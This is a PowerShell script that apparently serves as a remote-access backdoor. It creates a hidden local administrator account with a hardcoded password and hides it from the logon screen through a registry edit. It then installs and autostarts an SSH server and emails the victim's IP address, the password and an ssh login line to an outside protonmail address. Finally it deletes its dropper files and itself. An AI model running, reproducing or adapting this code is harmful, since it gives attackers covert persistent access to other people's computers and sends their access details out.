function random_text
{
    return -join ((65..90) + (97..122) | Get-Random -Count 5 | ForEach-Object {
        [char]$_
    })
}

function create_account
{
    [CmdletBinding()]
      param
      (
        [string] $system,
        [securestring] $syspass
      )
      begin { }
      process 
       {
         New-LocalUser "$system" -Password $syspass -FullName "$system" -Description "Temporary local admin"
         Write-Verbose "$system local user created"
         Add-LocalGroupMember -Group "Administrators" -Member "$system"
       }
      end { }
}

$wd = random_text
$base = "$env:temp/$wd"
$system =  "SystemAdmin"
$syspass = (ConvertTo-SecureString "Sys1emP@ss" -AsPlainText -Force)
$tmp = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\java.bat"
$file = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\file.txt"

create_account -system $system -syspass $syspass

mkdir $base
Set-Location $base

$confile = "$env:UserName.rat"
$internet = ( Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress

Add-Content -Path $confile -Value $internet
Add-Content -Path $confile -Value $base


$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"; $userName = "SystemAdmin"; $value = 0; if (-not (Test-Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts")) { New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "SpecialAccounts" }; if (-not (Test-Path $regPath)) { New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" -Name "UserList" }; Set-ItemProperty -Path $regPath -Name $userName -Value $value -Type DWord


Set-Location C:\Users
attrib +h +s +r SystemAdmin

Add-WindowsCapability -Online -Name OpenSSH.Server
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

Set-Location "$base"
$attachment = "$env:UserName.rat"
$User = "PASTE_USERNAME"; $PWord = ConvertTo-SecureString "PASTE_PASSWORD" -AsPlainText -Force; $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $User, $PWord; $IP = ( Get-NetIPConfiguration | Where-Object { $_.IPv4DefaultGateway -ne $null -and $_.NetAdapter.Status -ne "Disconnected"}).IPv4Address.IPAddress; $subject = "Cr0W: $env:UserName ip / Sys1emP@ss"; $attachment = "$env:UserName.rat"; Send-MailMessage -To 'null0abyss@protonmail.com' -From 'mailtrap@demomailtrap.com' -Subject "$subject" -Body "ssh SystemAdmin@$ip" -Credential ($Credential) -Attachments $attachment -SmtpServer 'sandbox.smtp.mailtrap.io' -Port 587

Remove-Item $tmp -Force  -Recurse -ErrorAction SilentlyContinue
Remove-Item $file -Force  -Recurse -ErrorAction SilentlyContinue
Remove-Item $PSCommandPath -Force
